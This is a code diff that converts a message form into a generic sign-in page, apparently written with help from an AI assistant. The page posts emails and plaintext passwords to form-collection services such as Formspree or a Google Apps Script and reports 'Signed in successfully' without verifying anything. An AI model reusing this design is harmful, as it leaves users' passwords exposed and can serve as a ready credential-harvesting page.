@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Leave a Message</title>
+  <title>Sign in</title>
   <style>
     :root {
       --bg: #0f172a;
@@ -67,26 +67,77 @@
     .msg { margin-top: 18px; font-size: 14px; text-align: center; min-height: 20px; }
     .msg.ok { color: var(--ok); }
     .msg.err { color: #f87171; }
+
+    /* password field with show/hide toggle */
+    .pw-wrap { position: relative; }
+    .pw-wrap input { padding-right: 72px; }
+    .pw-toggle {
+      position: absolute;
+      top: 50%;
+      right: 8px;
+      transform: translateY(-50%);
+      margin: 0;
+      width: auto;
+      padding: 6px 10px;
+      background: transparent;
+      color: var(--muted);
+      font-size: 13px;
+      font-weight: 600;
+      border-radius: 8px;
+    }
+    .pw-toggle:hover { background: transparent; color: var(--text); }
+    .pw-toggle:focus { outline: none; color: var(--text); }
+
+    /* remember me + forgot password row */
+    .row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 16px;
+    }
+    .remember {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin: 0;
+      font-size: 14px;
+      color: var(--muted);
+      cursor: pointer;
+    }
+    .remember input { width: auto; accent-color: var(--accent); cursor: pointer; }
+    a.forgot { font-size: 14px; color: var(--accent); text-decoration: none; }
+    a.forgot:hover { color: var(--accent-hover); }
+
+    .foot { margin-top: 24px; text-align: center; font-size: 14px; color: var(--muted); }
+    .foot a { color: var(--accent); text-decoration: none; font-weight: 600; }
+    .foot a:hover { color: var(--accent-hover); }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>Leave a Message</h1>
-    <p class="sub">Type something and hit send — it gets stored so the owner can read it.</p>
+    <h1>Welcome back</h1>
+    <p class="sub">Sign in to your account to continue.</p>
 
-    <form id="myForm">
-      <label for="name">Your name</label>
-      <input id="name" name="name" type="text" placeholder="Jane Doe" required />
+    <form id="loginForm">
+      <label for="email">Email</label>
+      <input id="email" name="email" type="email" placeholder="you@example.com" autocomplete="email" required />
 
-      <label for="email">Your email (optional)</label>
-      <input id="email" name="email" type="email" placeholder="jane@example.com" />
+      <label for="password">Password</label>
+      <div class="pw-wrap">
+        <input id="password" name="password" type="password" placeholder="••••••••" autocomplete="current-password" required minlength="6" />
+        <button type="button" class="pw-toggle" id="pwToggle" aria-label="Show password">Show</button>
+      </div>
 
-      <label for="message">Your message</label>
-      <textarea id="message" name="message" placeholder="Write your message here..." required></textarea>
+      <div class="row">
+        <label class="remember"><input type="checkbox" id="remember" name="remember" /> Remember me</label>
+        <a class="forgot" href="#">Forgot password?</a>
+      </div>
 
-      <button type="submit" id="submitBtn">Send</button>
+      <button type="submit" id="submitBtn">Sign in</button>
       <div class="msg" id="msg"></div>
     </form>
+
+    <p class="foot">Don't have an account? <a href="#">Sign up</a></p>
   </div>
 
   <script>
@@ -100,22 +151,48 @@
     // OPTION C (Netlify Forms) -> set to true and follow the README:
     const USE_NETLIFY = false;
     // ============================================================
+    // NOTE: this front-end only SENDS the credentials somewhere.
+    // It does not verify them by itself — whatever backend you point
+    // it at must do the actual checking (see note from the assistant).
+    // ============================================================
 
-    const form = document.getElementById("myForm");
+    const form = document.getElementById("loginForm");
     const btn = document.getElementById("submitBtn");
     const msg = document.getElementById("msg");
+    const pw = document.getElementById("password");
+    const pwToggle = document.getElementById("pwToggle");
+    const remember = document.getElementById("remember");
+
+    // Show / hide password
+    pwToggle.addEventListener("click", () => {
+      const show = pw.type === "password";
+      pw.type = show ? "text" : "password";
+      pwToggle.textContent = show ? "Hide" : "Show";
+      pwToggle.setAttribute("aria-label", show ? "Hide password" : "Show password");
+    });
+
+    // localStorage can be blocked inside sandboxed previews — wrap it
+    const safeGet = (k) => { try { return localStorage.getItem(k); } catch { return null; } };
+    const safeSet = (k, v) => { try { v === null ? localStorage.removeItem(k) : localStorage.setItem(k, v); } catch {} };
+
+    // Prefill email if the user chose "Remember me" before
+    const savedEmail = safeGet("loginEmail");
+    if (savedEmail) {
+      form.email.value = savedEmail;
+      remember.checked = true;
+    }
 
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
       msg.textContent = "";
       msg.className = "msg";
       btn.disabled = true;
-      btn.textContent = "Sending...";
+      btn.textContent = "Signing in...";
 
       const data = {
-        name: form.name.value,
-        email: form.email.value,
-        message: form.message.value,
+        email: form.email.value.trim(),
+        password: form.password.value,
+        remember: remember.checked,
         submitted: new Date().toISOString()
       };
 
@@ -123,7 +200,7 @@
         if (USE_NETLIFY) {
           // Netlify Forms: send as form-encoded with the form name
           const fd = new FormData(form);
-          fd.append("form-name", "myForm");
+          fd.append("form-name", "loginForm");
           await fetch("/", {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -146,16 +223,19 @@
           throw new Error("No backend configured. Open index.html and set SCRIPT_URL, FORMSPREE_URL, or USE_NETLIFY.");
         }
 
-        form.reset();
-        msg.textContent = "✅ Thanks! Your message was sent.";
+        // Remember / forget the email locally
+        safeSet("loginEmail", remember.checked ? data.email : null);
+
+        msg.textContent = "✅ Signed in successfully.";
         msg.className = "msg ok";
+        pw.value = "";
       } catch (err) {
         msg.textContent = "❌ Something went wrong. Please try again.";
         msg.className = "msg err";
         console.error(err);
       } finally {
         btn.disabled = false;
-        btn.textContent = "Send";
+        btn.textContent = "Sign in";
       }
     });
   </script>
